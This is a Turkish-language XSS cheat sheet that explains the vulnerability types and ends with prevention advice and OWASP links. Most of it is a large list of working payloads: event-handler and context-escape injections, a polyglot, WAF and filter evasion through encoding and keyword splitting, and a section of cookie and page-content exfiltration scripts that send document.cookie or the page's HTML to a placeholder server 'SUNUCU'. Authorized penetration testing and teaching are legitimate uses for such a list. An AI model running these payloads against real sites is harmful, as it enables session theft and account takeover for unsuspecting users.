# 01 - XSS (Cross-Site Scripting)

> Kullanıcı girdisinin sayfaya güvenli olmayan biçimde yansıtılmasıyla, kurbanın tarayıcısında JavaScript çalıştırılabildiği zafiyet.

## Zafiyet Nedir?

XSS, bir web uygulamasının kullanıcıdan gelen veriyi temizlemeden HTML/JS çıktısına yansıtmasından kaynaklanır. Saldırgan başka kullanıcıların tarayıcısında kod çalıştırabilir: oturum çerezi çalma, sayfa içeriğini değiştirme, kimlik avı, keylogging.

| Tür | Açıklama |
|-----|----------|
| Reflected | Payload istekle gönderilir, yanıtta anında yansır (arama kutusu vb.) |
| Stored | Payload sunucuda saklanır, her ziyaretçiye servis edilir (yorum alanı vb.) |
| DOM tabanlı | Zafiyet tamamen istemci tarafı JS'te oluşur, sunucuya hiç gitmeyebilir |

## Tespit

- Girdiye benzersiz işaretçi ver (`xsstest1337`), yanıtta nasıl yansıdığına bak.
- Yansıma bağlamını belirle: HTML gövdesi mi, öznitelik mi, `<script>` içi mi, URL mi?
- Zararsız test: `"><b>test</b>`

## Payload'lar

### Temel

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>
<script src=//14.rs></script>
```

### img etiketi

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror="alert(1)">
<img src=x:alert(alt) onerror=eval(src) alt=1>
<img src=x onerror=alert`1`>
<img/src=x/onerror=alert(1)>
<img src=`x`onerror=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onerror=this.src='//SUNUCU/?c='+document.cookie>
```

### svg etiketi

```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=x onbegin=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>tikla</text></a>
```

### Diğer etiketler ve olay yükleyicileri

```html
<body onload=alert(1)>
<body onpageshow=alert(1)>
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<input autofocus onfocus=alert(1)>
<input onauxclick=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<div onpointerover=alert(1)>hover</div>
<form><button formaction=javascript:alert(1)>gonder</button>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>tikla</a>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

### Öznitelik bağlamından kaçış

Girdi `value="..."` içine yansıyorsa:

```html
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onfocusin=alert(1) autofocus x="
"><svg onload=alert(1)>
'-alert(1)-'
```

### JavaScript bağlamı içinde

Girdi `<script>var x='...'</script>` içine düşüyorsa:

```javascript
';alert(1);//
";alert(1);//
'-alert(1)-'
\';alert(1)//
</script><script>alert(1)</script>
${alert(1)}
`-alert(1)-`
'};alert(1);{'
```

### DOM tabanlı

Zafiyetli sink'ler: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout`, `location`, `location.hash`.

```
#<img src=x onerror=alert(1)>
#"><img src=x onerror=alert(1)>
?name=<img src=x onerror=alert(1)>
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
#javascript:alert(1)
```

### Çerez / veri sızdırma (yalnızca yetkili testte)

```html
<script>new Image().src='//SUNUCU/?c='+document.cookie</script>
<script>fetch('//SUNUCU/?c='+encodeURIComponent(document.cookie))</script>
<script>navigator.sendBeacon('//SUNUCU',document.cookie)</script>
<img src=x onerror="fetch('//SUNUCU/?c='+document.cookie)">
<script>fetch('//SUNUCU/?d='+btoa(document.body.innerHTML))</script>
```

HttpOnly çerez JS ile okunamaz; o durumda CSRF token çalma veya sayfa içi eylem tetikleme hedeflenir.

### Polyglot (birden çok bağlamda çalışan)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

## Filtre / WAF Atlatma

### Büyük/küçük harf ve boşluk

```html
<ScRiPt>alert(1)</sCrIpT>
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<svg%09onload=alert(1)>
<svg/onload=alert(1)>
```

### Parantezsiz / tırnaksız

```html
<script>alert`1`</script>
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>
<script>throw onerror=alert,1</script>
<svg onload=alert&lpar;1&rpar;>
<script>window['ale'+'rt'](1)</script>
<script>self[`ale`+`rt`](1)</script>
```

### Kodlama

```html
&lt;script&gt;alert(1)&lt;/script&gt;
%3Cscript%3Ealert(1)%3C%2Fscript%3E
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<a href="&#x6a;avascript:alert(1)">x</a>
<a href="jav&#x09;ascript:alert(1)">x</a>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
```

### Anahtar kelime filtresini bozma

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x oneonerrorrror=alert(1)>
<a href="jav&#x0A;ascript:alert(1)">x</a>
<iframe src=jAvAsCrIpT:alert(1)>
```

## Korunma

1. Bağlama duyarlı çıktı kodlaması: HTML gövdesi, öznitelik, JS ve URL için ayrı ayrı doğru kaçış. Framework otomatik kaçışını (React JSX, Angular, Django) kapatma.
2. Girdi doğrulama (allow-list): Beklenen formatı zorunlu kıl.
3. Content Security Policy: `script-src 'self'` gibi katı bir CSP inline script'leri engeller.
4. HttpOnly ve Secure çerez bayrakları.
5. Tehlikeli API'lerden kaçın: `innerHTML`/`document.write`/`eval` yerine `textContent`, `createElement`, `setAttribute`. DOM temizliği için DOMPurify.
6. Framework'ü güncel tut.

## Kaynaklar

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [DOMPurify](https://github.com/cure53/DOMPurify)
